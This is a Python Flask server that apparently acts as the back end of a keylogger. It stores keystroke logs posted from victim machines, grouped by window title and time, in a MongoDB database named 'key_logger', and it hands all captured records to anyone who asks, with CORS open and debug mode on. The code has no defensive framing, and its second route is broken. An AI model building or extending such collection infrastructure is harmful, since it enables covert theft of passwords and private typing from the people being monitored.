from dotenv import load_dotenv
from flask import Flask, request, jsonify
from flask_cors import  CORS
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from bson.json_util import dumps
import json
import os
app = Flask(__name__)
CORS(app)

MONGO_URI = os.environ["MONGO_URI"]
client = MongoClient(MONGO_URI, server_api=ServerApi("1"))
db = client["key_logger"]
db_collection = db["KeyLogger"]

@app.route("/api/computers", methods=["GET", "POST"])
def home():

    if request.method == "POST":
        new_data = request.get_json()

        if not new_data or "machine_name" not in new_data or "data" not in new_data:
            return jsonify({"error": "Invalid data format"}), 400

        existing_record = db_collection.find_one({"machine_name": new_data["machine_name"]})

        if existing_record:
            print(f"Existing record: {existing_record}")
            existing_record = json.loads(dumps(existing_record))
            del existing_record['_id']

            merged_data = existing_record["data"].copy()
            for window in new_data["data"]:
                if window not in merged_data:
                    merged_data[window] = {}
                for time in new_data["data"][window]:
                    if time not in merged_data[window]:
                        merged_data[window][time] = ""
                    merged_data[window][time] += new_data["data"][window][time]

            db_collection.update_one(
                {"machine_name": new_data["machine_name"]},
                {"$set": {"data": merged_data}}
            )
        else:
            db_collection.insert_one(new_data)

        return jsonify({"message": "Data saved successfully"}), 201

    elif request.method == "GET":
        all_data = list(db_collection.find({}, {'_id': 0}))
        return jsonify(all_data), 200


@app.route("/api/computers/<computer>")
def get_computer():
    machine_name = request.args.get("computer")
    try:
        computer = db_collection.find({"machine_name": machine_name}, {'_id': 0})
        return computer
    except:
        pass


if __name__ == "__main__":
    app.run(debug=True)
